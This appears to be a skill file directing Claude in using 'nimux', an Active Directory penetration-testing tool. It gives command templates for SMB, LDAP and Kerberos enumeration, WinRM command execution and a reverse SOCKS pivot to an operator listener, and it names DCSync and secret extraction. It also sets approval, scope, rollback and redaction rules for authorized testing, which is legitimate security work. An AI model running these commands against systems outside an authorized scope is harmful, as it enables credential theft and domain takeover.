# nimux Skill for Claude

Use this skill when Claude is helping an authorized operator use `nimux`.

For full command coverage, Claude should read `integrations/COMMAND_SURFACE.md`.

## Core Behavior

Claude should treat `nimux` as the source of truth for command execution.

Before using a feature:

```bash
nimux --help
nimux <command> --help
```

Prefer `--json` for command output that Claude will parse.

Claude should understand all command families:

```text
scan, smb, ldap, kerberos, krb5conf, winrm, scm, bin, cim, tsch, mmc,
socks, secrets, dcsync, mssql, postgres, mysql, ssh, ftp, vnc, nfs,
afp, webdav, http, rdp, put, get, ls, mkdir, rm
```

## Safety Rules

Claude must ask for explicit approval before:

- running remote commands
- extracting secrets
- running DCSync
- changing passwords
- modifying LDAP objects
- changing ACLs
- creating, linking, or editing GPOs
- adding certificate mappings
- adding shadow credentials
- deploying SOCKS helpers
- using a pivot to reach a new internal network segment

Claude should use `--dry-run` and `--rollback-out` when available.

## Recommended Workflow

```text
1. Confirm scope.
2. Identify target hosts and domains.
3. Run read-only discovery.
4. Parse JSON output.
5. Explain confirmed paths.
6. Ask before writes or execution.
7. Verify changes.
8. Save rollback and evidence files.
```

## Common Commands

```bash
nimux scan <target> --port 445,389,5985 --open --json
nimux smb <host> -u <user> -p '<password>' -d <domain> --shares --json
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --query trusts --query admins --json
nimux krb5conf <dc> -d <domain> --out <domain>.krb5.conf
nimux kerberos <dc> -u <user> -p '<password>' -d <domain> --request kinit --out <user>.ccache
nimux winrm <host> -k --ccache <user>.ccache --krb5-config <domain>.krb5.conf -u <user> -d <domain> --spn WSMAN --cmd whoami --json
```

## Native Pivoting

`nimux socks` deploys a pivot helper that can keep running in the background. Once it is deployed, Claude should reuse the same `nimux` binary with `--proxy`.

Deploy reverse SOCKS after explicit approval:

```bash
nimux socks <pivot-host> -u <admin> -p '<password>' -d <domain> \
  --reverse --listener <operator-ip> --socks-port 1080 --control-port 1081
```

Then route `nimux` commands through it:

```bash
nimux scan <internal-cidr> --port 445,389,5985 --open \
  --proxy socks5://127.0.0.1:1080 --json

nimux smb <internal-host> -u <user> -p '<password>' -d <domain> \
  --proxy socks5://127.0.0.1:1080 --shares --json

nimux ldap <internal-dc> -u <user> -p '<password>' -d <domain> \
  --proxy socks5://127.0.0.1:1080 --query dcs --query trusts --json
```

Claude must record the cleanup values printed by `nimux socks`:

```text
local SOCKS URL
pid
task name
remote helper path
```

Cleanup:

```bash
nimux socks <pivot-host> -u <admin> -p '<password>' -d <domain> \
  --kill --pid <pid> --socks-task <task-name> --remote <remote-helper-path>
```

## Redaction

Claude must redact:

- passwords
- NT hashes
- AES keys
- Kerberos tickets
- private keys
- certificate private material
- DPAPI material
- session cookies

Use placeholders like:

```text
<password>
<nt_hash>
<ccache>
<ticket>
<private_key>
```
